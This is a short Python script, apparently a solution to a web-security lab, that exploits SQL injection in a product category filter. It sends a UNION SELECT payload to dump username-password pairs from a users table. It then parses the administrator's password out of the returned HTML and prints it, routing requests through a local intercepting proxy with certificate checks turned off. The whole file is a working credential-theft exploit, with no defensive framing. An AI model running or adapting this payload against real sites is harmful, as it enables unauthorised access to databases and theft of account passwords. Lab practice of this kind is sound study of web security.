import requests
import sys
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}


def exploit_sqli(url):
    
    path = "filter?category=Lifestyle"
    username ='administrator'
    payload = "' union select null,username||'-'||password from users--"
    r=requests.get(url+path+payload,verify=False,proxies=proxies)
    text = r.text
    if username not in text:
        return False
    else:
        print("Found the administrator password!")
        soup = BeautifulSoup(text,"html.parser")
        password_th = soup.find('th', string=re.compile(r'^administrator-'))
        password_text = password_th.text
        password = password_text.split('-')[1]
        print("your password is")
        print(password)
        return True




def main():
    try:
        
        url = sys.argv[1]
    
    except IndexError:

        print("[-] usage %s www.example.com"%sys.argv[0])
    
    if not exploit_sqli(url):
        print("unable to dump the database")
    else:
        print("Ending up the injection ...")





if __name__ == "__main__":
    main()
